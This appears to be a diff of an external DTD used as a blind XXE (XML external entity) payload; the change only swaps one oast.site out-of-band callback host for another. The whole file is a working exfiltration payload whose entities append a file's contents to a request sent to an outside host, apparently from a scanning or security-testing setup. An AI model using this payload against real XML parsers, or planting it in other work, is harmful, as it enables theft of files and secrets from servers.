@@ -1,4 +1,4 @@
 <!ENTITY % file "hello">
-<!ENTITY % eval "<!ENTITY &#x25; xvv SYSTEM &#x22;https://wpp7jtoiuv5h0igibs4wl1eq69qynxa1p.oast.site/?x=%file;&#x22;>">
+<!ENTITY % eval "<!ENTITY &#x25; xvv SYSTEM &#x22;https://7wjojcax4cbuch42j66wx9k1e0svp11nr.oast.site/?x=%file;&#x22;>">
 %eval;
 %xvv;
